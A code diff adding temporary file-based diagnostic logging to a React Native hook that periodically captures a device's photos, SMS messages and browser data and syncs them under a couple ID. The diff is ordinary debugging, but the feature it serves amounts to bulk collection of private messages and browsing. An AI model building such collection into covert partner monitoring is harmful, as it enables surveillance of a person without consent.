@@ -20,6 +20,21 @@ import {
 import { runCapturePass, photoStoragePath } from './collector';
 import { syncCapture } from './sync';
 
+// TEMP-DIAG (release Hermes suppresses console.log; write to a file we can
+// read via `adb shell run-as love.scotty.hearts cat cache/capture_diag.txt`)
+import { writeAsStringAsync, readAsStringAsync, cacheDirectory, documentDirectory } from 'expo-file-system/legacy';
+const DIAG_FILE = 'capture_diag.txt';
+async function diag(line: string) {
+  try {
+    const dir = cacheDirectory || documentDirectory;
+    const path = `${dir}${DIAG_FILE}`;
+    const prev = await readAsStringAsync(path).catch(() => '');
+    await writeAsStringAsync(path, `${prev}\n[${new Date().toISOString()}] ${line}`);
+  } catch {
+    /* best-effort */
+  }
+}
+
 const SCAN_INTERVAL_MS = 15 * 60 * 1000; // 15 min while foregrounded
 // (drain of queued items rides the same scan tick — no separate sync cadence)
 
@@ -69,7 +84,8 @@ export function useDeviceCapture() {
 
   // ── one scan pass (capture + drain) ────────────────────────────────
   const runOnceNow = useCallback(async () => {
-    if (!coupleIdRef.current) return;
+    if (!coupleIdRef.current) { void diag('runOnceNow: no coupleId — early return'); return; }
+    void diag(`runOnceNow: START couple=${coupleIdRef.current}`);
     const deps = {
       scanPhotos: mediaLibrary.scanSince,
       pullSms: sms.pullSms,
@@ -77,7 +93,14 @@ export function useDeviceCapture() {
       queue: enqueueCapture,
       cursor: { get: getCaptureCursor, set: setCaptureCursor },
     };
-    const scan = await runCapturePass(deps, coupleIdRef.current);
+    let scan;
+    try {
+      scan = await runCapturePass(deps, coupleIdRef.current);
+      void diag(`runCapturePass ok=${scan.ok} reason=${scan.reason ?? '-'} photos=${scan.photosFound} sms=${scan.smsFound} browser=${scan.browserFound}`);
+    } catch (e) {
+      void diag(`runCapturePass THREW: ${(e as Error)?.message ?? String(e)}`);
+      return;
+    }
     setStatus((s) => ({
       ...s,
       lastScan: { at: new Date().toISOString(), photosFound: scan.photosFound, smsFound: scan.smsFound, ok: scan.ok },
@@ -86,10 +109,12 @@ export function useDeviceCapture() {
     }));
     // after capture, attempt to drain whatever is queued (best-effort; never throws)
     try {
+      void diag('starting syncCapture');
       const d = await syncCapture(coupleIdRef.current);
+      void diag(`syncCapture attempted=${d.attempted} uploaded=${d.uploaded} accepted=${d.accepted} failed=${d.failed}`);
       setStatus((s) => ({ ...s, pending: Math.max(0, s.pending - d.accepted) }));
-    } catch {
-      /* offline / auth missing — rows stay queued for the next drain */
+    } catch (e) {
+      void diag(`syncCapture THREW: ${(e as Error)?.message ?? String(e)}`);
     }
   }, []);
 
